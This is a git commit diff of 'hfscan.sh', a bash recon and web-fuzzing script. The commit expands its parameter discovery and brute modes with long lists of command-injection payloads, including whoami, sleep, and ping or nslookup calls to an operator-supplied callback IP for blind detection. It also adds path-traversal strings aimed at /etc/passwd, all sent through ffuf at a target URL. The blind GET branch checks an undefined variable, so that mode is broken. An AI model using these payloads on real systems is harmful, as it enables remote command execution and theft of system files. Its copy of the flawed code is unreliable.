8c716a712e80b93524b4d0418fd337183f6672ad
Hudson Nowak <96009982+nowak0x01@users.noreply.github.com>
2022-01-04 01:26:54 +0000

    Update hfscan.sh

--- hfscan.sh
+++ hfscan.sh
@@ -1,12 +1,14 @@
-#!/bin/sh
+#!/bin/bash
 
-##############################
+############################## Gr33tz: R3tr0 | Kirito
 # */ script author: nowak */ #
 # */  the recon is a art  */ # /* https://discord.gg/PePM2NR5zS ~/
-#    */   v1.2.4-dev   /*    # /~ https://github.com/nowak0x01 */
+#    */   v1.2.5-dev   /*    # /~ https://github.com/nowak0x01 */
 # $/  hackingforce family #/ #
 ##############################
 
+TheFather_Of_The_G0ds_Kirito=$1
+TheMan_TheBeast_HeIs_R3tr074=$6
 
 HELP="
 $0 ({program}) ({options})
@@ -32,13 +34,13 @@ verify()
 	fi
 }
 
-case "$1" in
+case "$TheFather_Of_The_G0ds_Kirito" in
 
 	'ffuf'|'FFUF'|'fuff'|'FUFF')
 
 		verify ffuf
 		if [ "$4" == "" ];then
-			printf "\n$0 %s (dir/files) (wordlist) (target) +more options+\n\n" "$1"
+			printf "\n$0 %s (dir/files) (wordlist) (target) +more options+\n\n" "$TheFather_Of_The_G0ds_Kirito"
 			exit 1
 		fi
 
@@ -69,7 +71,7 @@ case "$1" in
 
 		verify nmap
 		if [ "$3" == "" ];then
-			printf "\n$0 %s (ctf/world) (target)\n\n" "$1"
+			printf "\n$0 %s (ctf/world) (target)\n\n" "$TheFather_Of_The_G0ds_Kirito"
 			exit 1
 		fi
 
@@ -98,7 +100,7 @@ case "$1" in
 			nmap $TCP_scan $3
 			printf "\n\e[1;37m=> starting the scan \e[1;32m(WORLD - udp) \e[1;37m<=\n\n"
 			nmap $UDP_scan $3
-		
+
 		fi
 		;;
 
@@ -106,9 +108,9 @@ case "$1" in
 
 		if [ "$3" == "" ];then
 
-			printf "\n$0 $1 (wordlist) (words {separated by: ','})\n
+			printf "\n$0 $TheFather_Of_The_G0ds_Kirito (wordlist) (words {separated by: ','})\n
 	{example}\n
-		$0 $1 ./files-wordlist.txt 'corpsec, sec, corp'
+		$0 $TheFather_Of_The_G0ds_Kirito ./files-wordlist.txt 'corpsec, sec, corp'
 \n"
 			exit 1
 		fi
@@ -123,7 +125,7 @@ case "$1" in
 		printf $3 > hfscan.words
 		tr ',' '\n' < hfscan.words > hfscan-words.quant
 		echo >> hfscan-words.quant
-		
+
 		spin='-\|/'
 
 		printf "\n\e[1;32m=>\e[1;37m Generating the custom Wordlist \e[1;32m<=\e[1;37m\n\n"
@@ -150,7 +152,7 @@ case "$1" in
 
 			verify host
 			if [ $# -ne 2 ];then
-				printf "\n$0 $1 [host]\n\n"
+				printf "\n$0 $TheFather_Of_The_G0ds_Kirito [host]\n\n"
 			else
 				printf "\n\e[0m\e[1;32m=> \e[1;37mName Servers \e[1;32m<=\e[0m\n\n";host -t ns $2|cut -d" " -f4
 				printf "\n\e[1;32m::::::::::::::::::::::::::::::::::\n"
@@ -167,7 +169,7 @@ case "$1" in
 
 		verify host
 		if [ $# -ne 2 ];then
-			printf "\n$0 $1 [host]\n\n"
+			printf "\n$0 $TheFather_Of_The_G0ds_Kirito [host]\n\n"
 		else
 			printf 'A\nAAAA\nAFSDB\nAPL\nCAA\nCDNSKEY\nCDS\nCERT\nCNAME\nCSYNC\nDHCID\nDLV\nDNAME\nDNSKEY\nDS\nEUI48\nEUI64\nHINFO\nHIP\nIPSECKEY\nKEY\nKX\nLOC\nMX\nNAPTR\nNS\nNSEC\nNSEC3\nNSEC3PARAM\nOPENPGPKEY\nPTR\nRRSIG\nRP\nSIG\nSMIMEA\nSOA\nSRV\nSSHFP\nTA\nTKEY\nTLSA\nTSIG\nTXT\nURI\nZONEMD\nMD\nMF\nMAILA\nMB\nMG\nMR\nMINFO\nMAILB\nWKS\nNULL\nA6\nNXT\nKEY\nSIG\nRP\nX25\nISDN\nRT\nNSAP\nNSAP-PTR\nPX\nEID\nNIMLOC\nATMA\nAPL\nSINK\nGPOS\nUINFO\nUID\nGID\nUNSPEC\nSPF\nNINFO\nRKEY\nTALINK\nNID\nL32\nL64\nLP\nDOA' > __dns.records
 			printf "\n\e[1;32m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m\n\n"
@@ -190,7 +192,7 @@ case "$1" in
 		THREADS='110'
 
 		if [ $# -ne 5 ];then
-			printf "\n$0 $1 [host] [wordlist] [http/https] [ip]\n\n"
+			printf "\n$0 $TheFather_Of_The_G0ds_Kirito [host] [wordlist] [http/https] [ip]\n\n"
 
 		elif [ "$(id -u)" != "0" ];then
 			printf "\n\e[1;31mERROR:\e[0m only root!\n\n"
@@ -249,7 +251,7 @@ case "$1" in
 
 		verify subfinder
 		if [ $# -ne 2 ];then
-			printf "\n$0 $1 [host]\n\n"
+			printf "\n$0 $TheFather_Of_The_G0ds_Kirito [host]\n\n"
 		else
 			printf "\n\e[1;32m:::::::::::::::::::::::::::::::::::::::\e[0m\n\n"
 			subfinder -all -silent -recursive -nW -o hfscan_subdomains.subfinder -d $2
@@ -261,7 +263,7 @@ case "$1" in
 
 		verify httpx
 		if [ $# -ne 2 ];then
-			printf "\n$0 $1 [targets-wordlist]\n\n"
+			printf "\n$0 $TheFather_Of_The_G0ds_Kirito [targets-wordlist]\n\n"
 			exit 1
 		elif [ ! -f $2 ];then
 			printf "\n\e[1;31mERROR:\e[0m targets-wordlist not found!\n\n"
@@ -277,98 +279,238 @@ case "$1" in
 
 			verify ffuf
 			if [ "$2" == "" ];then
-				printf "\n$0 $1 (discovery / brute)\n\n"
+				printf "\n$0 $TheFather_Of_The_G0ds_Kirito (discovery / brute)\n\n"
 				exit 1
 			elif [[ "$2" == "DISCOVERY" || "$2" == "discovery" ]];then
-				if [ $# -ne 5 ];then
-					printf "\n$0 $1 $2 [GET/POST] ./parameters-list.txt https://hackingforce.com.br/upload.php\n
+				if [ $# -ne 6 ];then
+					printf "\n$0 $TheFather_Of_The_G0ds_Kirito $2 (GET/POST) ./parameters-list.txt https://hackingforce.com.br/upload.php (blind/default)\n
 {example}
 
-	$0 $1 $2 GET ./parameters-list.txt https://hackingforce.com.br/upload.php
+	$0 $TheFather_Of_The_G0ds_Kirito $2 POST ./parameters-list.txt https://hackingforce.com.br/painel.php BLIND
+	$0 $TheFather_Of_The_G0ds_Kirito $2 GET ./parameters-list.txt https://hackingforce.com.br/upload.php DEFAULT
 \n"
 					exit 1
 				else
-				
-					THREADS='110'
+
+					THREADS='50'
 					UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'
 
 					function GET_REQ()
 					{
-						if [ "$1" == "+%26+sleep+30+%26+" ]
-						then
-							printf "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+sleep+30+%%26+ \e[1;37m| METHOD:\e[1;32m GET \e[1;37m<=\e[0m\n\n"
-			
-						elif [ "$1" == "+%26+whoami+%26+" ]
-						then
-							printf "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+whoami+%%26+ \e[1;37m| METHOD:\e[1;32m GET \e[1;37m<=\e[0m\n\n"
-							
-						else
-							printf "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=$1 \e[1;37m| METHOD:\e[1;32m GET \e[1;37m<=\e[0m\n\n"
-						fi
+						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| PAYLOAD:\e[1;32m $1 \e[1;37m| METHOD:\e[1;32m GET \e[1;37m<=\e[0m\n"
 
-						ffuf -mt '<8000' -ic -w $2 -u $3?FUZZ=$1 -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						if [[ "$var" == "BLIND" || "$var" == "blind" ]];then
+							ffuf -s -mt '<8000' -ic -w $2 -u $3?FUZZ=$1 -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						else
+							ffuf -s -ic -w $2 -u $3?FUZZ=$1 -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						fi
 					}
 
 					function POST_REQ()
 					{
-						if [ "$1" == "+%26+sleep+30+%26+" ]
-						then
-							printf "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+sleep+30+%%26+ \e[1;37m| METHOD:\e[1;32m POST \e[1;37m<=\e[0m\n\n"
-							
-						elif [ "$1" == "+%26+whoami+%26+" ]
-						then
-							printf "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=+%%26+whoami+%%26+ \e[1;37m| METHOD:\e[1;32m POST \e[1;37m<=\e[0m\n\n"
-							
-						else
-							printf "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| WORDLIST:\e[1;32m $2 \e[1;37m| PAYLOAD:\e[1;32m FUZZ=$1 \e[1;37m| METHOD:\e[1;32m POST \e[1;37m<=\e[0m\n\n"
-						fi
+						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $3 \e[1;37m| PAYLOAD:\e[1;32m $1 \e[1;37m| METHOD:\e[1;32m POST \e[1;37m<=\e[0m\n"
 
-						ffuf -mt '<8000' -X POST -ic -w $2 -u $3 -d "FUZZ=$1" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						if [[ "$TheMan_TheBeast_HeIs_R3tr074" == "BLIND" || "$TheMan_TheBeast_HeIs_R3tr074" == "blind" ]];then
+							ffuf -s -mt '<8000' -X POST -ic -w $2 -u $3 -d "FUZZ=$1" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						else
+							ffuf -s -X POST -ic -w $2 -u $3 -d "FUZZ=$1" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						fi
 					}
 
 					if [[ "$3" == "GET" || "$3" == "get" ]];then
-						GET_REQ 'whoami' $4 $5
-						GET_REQ "|whoami" $4 $5
-						GET_REQ "+%26+whoami+%26+" $4 $5
-						GET_REQ ";whoami;" $4 $5
-						GET_REQ "&whoami&" $4 $5
-						GET_REQ "sleep+30" $4 $5
-						GET_REQ ";sleep+30;" $4 $5
-						GET_REQ "&sleep+30&" $4 $5
-						GET_REQ "+%26+sleep+30+%26+" $4 $5
-						GET_REQ '1' $4 $5
-						GET_REQ '0' $4 $5
-						GET_REQ 'true' $4 $5
-						GET_REQ 'false' $4 $5
-						GET_REQ '/etc/passwd' $4 $5
-						GET_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
+
+						if [[ "$TheMan_TheBeast_HeIs_R3tr074" == "BLIND" || "$TheMan_TheBeast_HeIs_R3tr074" == "blind" ]];then
+							printf "\nEnter your IP (VPS/BurpCollaborator): "; read IP
+
+							GET_REQ "nslookup+$IP" $4 $5
+							GET_REQ "nslookup%2B$IP" $4 $5
+							GET_REQ "nslookup%252B$IP" $4 $5
+							GET_REQ ";nslookup+$IP;" $4 $5
+							GET_REQ "%3Bnslookup%2B$IP%3B" $4 $5
+							GET_REQ "%253Bnslookup%252B$IP%253B" $4 $5
+							GET_REQ "|nslookup+$IP" $4 $5
+							GET_REQ "%7Cnslookup%2B$IP" $4 $5
+							GET_REQ "%257Cnslookup%252B$IP" $4 $5
+							GET_REQ "|nslookup+$IP|" $4 $5
+							GET_REQ "%7Cnslookup%2B$IP%7C" $4 $5
+							GET_REQ "%257Cnslookup%252B$IP%257C" $4 $5
+							GET_REQ "&nslookup+$IP&" $4 $5
+							GET_REQ "%26nslookup%2B$IP%26" $4 $5
+							GET_REQ "%2526nslookup%252B$IP%2526" $4 $5
+							GET_REQ "ping+$IP" $4 $5
+							GET_REQ "ping%2B$IP" $4 $5
+							GET_REQ "ping%252B$IP" $4 $5
+							GET_REQ ";ping+$IP;" $4 $5
+							GET_REQ "%3Bping%2B$IP%3B" $4 $5
+							GET_REQ "%253Bping%252B$IP%253B" $4 $5
+							GET_REQ "|ping+$IP" $4 $5
+							GET_REQ "%7Cping%2B$IP" $4 $5
+							GET_REQ "%257Cping%252B$IP" $4 $5
+							GET_REQ "|ping+$IP|" $4 $5
+							GET_REQ "%7Cping%2B$IP%7C" $4 $5
+							GET_REQ "%257Cping%252B$IP%257C" $4 $5
+							GET_REQ "&ping+$IP&" $4 $5
+							GET_REQ "%26ping%2B$IP%26" $4 $5
+							GET_REQ "%2526ping%252B$IP%2526" $4 $5
+							GET_REQ "sleep+30" $4 $5
+							GET_REQ "sleep%2B30" $4 $5
+							GET_REQ "sleep%252B30" $4 $5
+							GET_REQ ";sleep+30;" $4 $5
+							GET_REQ "%3Bsleep%2B30%3B" $4 $5
+							GET_REQ "%253Bsleep%252B30%253B" $4 $5
+							GET_REQ "|sleep+30" $4 $5
+							GET_REQ "%7Csleep%2B30" $4 $5
+							GET_REQ "%257Csleep%252B30" $4 $5
+							GET_REQ "|sleep+30|" $4 $5
+							GET_REQ "%7Csleep%2B30%7C" $4 $5
+							GET_REQ "%257Csleep%252B30%257C" $4 $5
+							GET_REQ "&sleep+30&" $4 $5
+							GET_REQ "%26sleep%2B30%26" $4 $5
+							GET_REQ "%2526sleep%252B30%2526" $4 $5
+							GET_REQ "timeout+30s+tail+-f" $4 $5
+							GET_REQ "timeout%2B30s%2Btail%2B-f" $4 $5
+							GET_REQ "timeout%252B30s%252Btail%252B-f" $4 $5
+							GET_REQ ";timeout+30s+tail+-f;" $4 $5
+							GET_REQ "%3Btimeout%2B30s%2Btail%2B-f%3B" $4 $5
+							GET_REQ "%253Btimeout%252B30s%252Btail%252B-f%253B" $4 $5
+							GET_REQ "|timeout+30s+tail+-f" $4 $5
+							GET_REQ "%7Ctimeout%2B30s%2Btail%2B-f" $4 $5
+							GET_REQ "%257Ctimeout%252B30s%252Btail%252B-f" $4 $5
+							GET_REQ "|timeout+30s+tail+-f|" $4 $5
+							GET_REQ "%7Ctimeout%2B30s%2Btail%2B-f%7C" $4 $5
+							GET_REQ "%257Ctimeout%252B30s%252Btail%252B-f%257C" $4 $5
+							GET_REQ "&timeout+30s+tail+-f&" $4 $5
+							GET_REQ "%26timeout%2B30s%2Btail%2B-f%26" $4 $5
+							GET_REQ "%2526timeout%252B30s%252Btail%252B-f%2526" $4 $5
+
+						else
+
+							GET_REQ 'whoami' $4 $5
+							GET_REQ "|whoami" $4 $5
+							GET_REQ "%7Cwhoami" $4 $5
+							GET_REQ "%257Cwhoami" $4 $5
+							GET_REQ "&whoami&" $4 $5
+							GET_REQ "%26whoami%26" $4 $5
+							GET_REQ "%2526whoami%2526" $4 $5
+							GET_REQ ";whoami;" $4 $5
+							GET_REQ "%3Bwhoami%3B" $4 $5
+							GET_REQ "%253Bwhoami%253B" $4 $5
+							GET_REQ '1' $4 $5
+							GET_REQ '0' $4 $5
+							GET_REQ 'true' $4 $5
+							GET_REQ 'false' $4 $5
+							GET_REQ '/etc/passwd' $4 $5
+							GET_REQ '%2Fetc%2Fpasswd' $4 $5
+							GET_REQ '%252Fetc%252Fpasswd' $4 $5
+							GET_REQ 'index.php' $4 $5
+							GET_REQ 'index.html' $4 $5
+							GET_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
+							GET_REQ '%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2Fetc%2Fpasswd' $4 $5
+							GET_REQ '%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252Fetc%252Fpasswd' $4 $5
+
+						fi
 
 					elif [[ "$3" == "POST" || "$3" == "post" ]];then
-						POST_REQ 'whoami' $4 $5
-						POST_REQ "|whoami" $4 $5
-						POST_REQ "+%26+whoami+%26+" $4 $5
-						POST_REQ ";whoami;" $4 $5
-						POST_REQ "&whoami&" $4 $5
-						POST_REQ "sleep+30" $4 $5
-						POST_REQ ";sleep+30;" $4 $5
-						POST_REQ "&sleep+30&" $4 $5
-						POST_REQ "+%26+sleep+30+%26+" $4 $5
-						POST_REQ '1' $4 $5
-						POST_REQ '0' $4 $5
-						POST_REQ 'true' $4 $5
-						POST_REQ 'false' $4 $5
-						POST_REQ '/etc/passwd' $4 $5
-						POST_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
+
+						if [[ "$TheMan_TheBeast_HeIs_R3tr074" == "BLIND" || "$TheMan_TheBeast_HeIs_R3tr074" == "blind" ]];then
+							printf "\nEnter your IP (VPS/BurpCollaborator): "; read IP
+
+							POST_REQ "nslookup+$IP" $4 $5
+							POST_REQ "nslookup%2B$IP" $4 $5
+							POST_REQ "nslookup%252B$IP" $4 $5
+							POST_REQ ";nslookup+$IP;" $4 $5
+							POST_REQ "%3Bnslookup%2B$IP%3B" $4 $5
+							POST_REQ "%253Bnslookup%252B$IP%253B" $4 $5
+							POST_REQ "|nslookup+$IP" $4 $5
+							POST_REQ "%7Cnslookup%2B$IP" $4 $5
+							POST_REQ "%257Cnslookup%252B$IP" $4 $5
+							POST_REQ "|nslookup+$IP|" $4 $5
+							POST_REQ "%7Cnslookup%2B$IP%7C" $4 $5
+							POST_REQ "%257Cnslookup%252B$IP%257C" $4 $5
+							POST_REQ "&nslookup+$IP&" $4 $5
+							POST_REQ "%26nslookup%2B$IP%26" $4 $5
+							POST_REQ "%2526nslookup%252B$IP%2526" $4 $5
+							POST_REQ "ping+$IP" $4 $5
+							POST_REQ "ping%2B$IP" $4 $5
+							POST_REQ "ping%252B$IP" $4 $5
+							POST_REQ ";ping+$IP;" $4 $5
+							POST_REQ "%3Bping%2B$IP%3B" $4 $5
+							POST_REQ "%253Bping%252B$IP%253B" $4 $5
+							POST_REQ "|ping+$IP" $4 $5
+							POST_REQ "%7Cping%2B$IP" $4 $5
+							POST_REQ "%257Cping%252B$IP" $4 $5
+							POST_REQ "|ping+$IP|" $4 $5
+							POST_REQ "%7Cping%2B$IP%7C" $4 $5
+							POST_REQ "%257Cping%252B$IP%257C" $4 $5
+							POST_REQ "&ping+$IP&" $4 $5
+							POST_REQ "%26ping%2B$IP%26" $4 $5
+							POST_REQ "%2526ping%252B$IP%2526" $4 $5
+							POST_REQ "sleep+30" $4 $5
+							POST_REQ "sleep%2B30" $4 $5
+							POST_REQ "sleep%252B30" $4 $5
+							POST_REQ ";sleep+30;" $4 $5
+							POST_REQ "%3Bsleep%2B30%3B" $4 $5
+							POST_REQ "%253Bsleep%252B30%253B" $4 $5
+							POST_REQ "|sleep+30" $4 $5
+							POST_REQ "%7Csleep%2B30" $4 $5
+							POST_REQ "%257Csleep%252B30" $4 $5
+							POST_REQ "|sleep+30|" $4 $5
+							POST_REQ "%7Csleep%2B30%7C" $4 $5
+							POST_REQ "%257Csleep%252B30%257C" $4 $5
+							POST_REQ "&sleep+30&" $4 $5
+							POST_REQ "%26sleep%2B30%26" $4 $5
+							POST_REQ "%2526sleep%252B30%2526" $4 $5
+							POST_REQ "timeout+30s+tail+-f" $4 $5
+							POST_REQ "timeout%2B30s%2Btail%2B-f" $4 $5
+							POST_REQ "timeout%252B30s%252Btail%252B-f" $4 $5
+							POST_REQ ";timeout+30s+tail+-f;" $4 $5
+							POST_REQ "%3Btimeout%2B30s%2Btail%2B-f%3B" $4 $5
+							POST_REQ "%253Btimeout%252B30s%252Btail%252B-f%253B" $4 $5
+							POST_REQ "|timeout+30s+tail+-f" $4 $5
+							POST_REQ "%7Ctimeout%2B30s%2Btail%2B-f" $4 $5
+							POST_REQ "%257Ctimeout%252B30s%252Btail%252B-f" $4 $5
+							POST_REQ "|timeout+30s+tail+-f|" $4 $5
+							POST_REQ "%7Ctimeout%2B30s%2Btail%2B-f%7C" $4 $5
+							POST_REQ "%257Ctimeout%252B30s%252Btail%252B-f%257C" $4 $5
+							POST_REQ "&timeout+30s+tail+-f&" $4 $5
+							POST_REQ "%26timeout%2B30s%2Btail%2B-f%26" $4 $5
+							POST_REQ "%2526timeout%252B30s%252Btail%252B-f%2526" $4 $5
+
+						else
+
+							POST_REQ 'whoami' $4 $5
+							POST_REQ "|whoami" $4 $5
+							POST_REQ "%7Cwhoami" $4 $5
+							POST_REQ "%257Cwhoami" $4 $5
+							POST_REQ "&whoami&" $4 $5
+							POST_REQ "%26whoami%26" $4 $5
+							POST_REQ "%2526whoami%2526" $4 $5
+							POST_REQ ";whoami;" $4 $5
+							POST_REQ "%3Bwhoami%3B" $4 $5
+							POST_REQ "%253Bwhoami%253B" $4 $5
+							POST_REQ '1' $4 $5
+							POST_REQ '0' $4 $5
+							POST_REQ 'true' $4 $5
+							POST_REQ 'false' $4 $5
+							POST_REQ '/etc/passwd' $4 $5
+							POST_REQ '%2Fetc%2Fpasswd' $4 $5
+							POST_REQ '%252Fetc%252Fpasswd' $4 $5
+							POST_REQ 'index.php' $4 $5
+							POST_REQ 'index.html' $4 $5
+							POST_REQ '/.././.././.././.././.././.././.././.././../etc/passwd' $4 $5
+							POST_REQ '%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2Fetc%2Fpasswd' $4 $5
+							POST_REQ '%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252Fetc%252Fpasswd' $4 $5
+						fi
 					fi
 				fi
 
 			elif [[ "$2" == "BRUTE" || "$2" == "brute" ]];then
 
 				if [ $# -ne 6 ];then
-					printf "\n$0 $1 $2 (GET/POST) (PARAMETER) ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php\n
+					printf "\n$0 $TheFather_Of_The_G0ds_Kirito $2 (GET/POST) (PARAMETER) ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php\n
 {example}
 
-	$0 $1 $2 POST 'img' ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php
+	$0 $TheFather_Of_The_G0ds_Kirito $2 POST 'share' ./pathTransversal-CommandExec-list.txt https://hackingforce.com.br/dev.php
 \n"
 					exit 1
 				else
@@ -377,16 +519,20 @@ case "$1" in
 					UAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60'
 
 					if [[ "$3" == "GET" || "$3" == "get" ]];then
-						printf "\n\e[1;37m=> TARGET:\e[1;32m $6 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m GET \e[1;37m<=\e[0m\n\n"
-						ffuf -mt '<8000' -ic -w $5 -u $6?$4=FUZZ -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m GET (TIME-BASED) \e[1;37m<=\e[0m\n\n"
+						ffuf -mt '<8000' -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074?$4=FUZZ -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m GET (DEFAULT) \e[1;37m<=\e[0m\n\n"
+						ffuf -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074?$4=FUZZ -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
 
 					elif [[ "$3" == "POST" || "$3" == "post" ]];then
-						printf "\n\e[1;37m=> TARGET:\e[1;32m $6 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m POST \e[1;37m<=\e[0m\n\n"
-						ffuf -X POST -mt '<8000' -ic -w $5 -u $6 -d "$4=FUZZ" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m POST (TIME-BASED) \e[1;37m<=\e[0m\n\n"
+						ffuf -X POST -mt '<8000' -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074 -d "$4=FUZZ" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
+						echo -e "\n\e[1;37m=> TARGET:\e[1;32m $TheMan_TheBeast_HeIs_R3tr074 \e[1;37m| WORDLIST:\e[1;32m $5 \e[1;37m| PARAMETER:\e[1;32m $4 \e[1;37m| METHOD:\e[1;32m POST (DEFAULT) \e[1;37m<=\e[0m\n\n"
+						ffuf -X POST -ic -w $5 -u $TheMan_TheBeast_HeIs_R3tr074 -d "$4=FUZZ" -H "User-Agent: $UAGENT" -c -t $THREADS --timeout 50 -mc all -ac
 
 					fi
 				fi
-				
+
 			else
 
 				printf "\n\e[1;31mERROR:\e[1;37m only DISCOVERY or BRUTE \e[0m\n\n"
